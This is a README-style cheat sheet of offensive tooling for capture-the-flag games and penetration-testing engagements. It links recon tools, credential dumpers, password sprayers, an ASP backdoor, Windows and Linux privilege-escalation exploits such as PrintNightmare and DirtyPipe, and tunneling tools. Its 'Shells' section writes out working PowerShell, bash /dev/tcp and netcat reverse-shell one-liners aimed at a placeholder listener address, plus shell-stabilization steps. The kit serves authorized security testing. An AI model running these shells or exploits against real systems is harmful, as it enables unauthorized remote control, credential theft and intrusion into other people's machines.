# Tools Of The Trade
A collection of tools for CTFs or engagements

### Recon
```
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
https://github.com/EnableSecurity/wafw00f
```
```
https://github.com/ropnop/kerbrute
https://github.com/SnaffCon/Snaffler
https://github.com/AlessandroZ/LaZagne
https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
https://github.com/clr2of8/DPAT
```
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
https://github.com/dmchell/SharpView
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://github.com/fox-it/BloodHound.py
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
https://github.com/leoloobeek/LAPSToolkit
https://github.com/ropnop/windapsearch
https://github.com/byt3bl33d3r/pth-toolkit
https://github.com/ShutdownRepo/targetedKerberoast
https://github.com/rvazarkar/GMSAPasswordReader
```

### Exploitation
```
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
https://github.com/topotam/PetitPotam
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
```

### Shells
```
# Asp Backdoor
https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp

# Netcat executable
https://github.com/int0x33/nc.exe/raw/master/nc.exe

# Powershell Revshell One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENER_IP>',<LISTENER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Linux Revshell One-liners
bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f

# Shell Stabilization
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;
stty raw -echo; fg; 
ls; 
export SHELL=/bin/bash; 
export TERM=screen; 
stty rows 38 columns 116; 
reset;
```

### Tunneling
```
https://github.com/nccgroup/SocksOverRDP
https://www.proxifier.com/download/ProxifierPE.zip
https://github.com/jpillora/chisel/releases
https://github.com/klsecservices/rpivot.git
https://github.com/lukebaggett/dnscat2-powershell.git
https://github.com/iagox86/dnscat2.git
https://github.com/utoni/ptunnel-ng.git
```

### Misc
```
https://github.com/Flangvik/SharpCollection
https://10minutemail.com/
https://lolbas-project.github.io/
https://github.com/FortyNorthSecurity/EyeWitness
https://www.pingcastle.com/
```
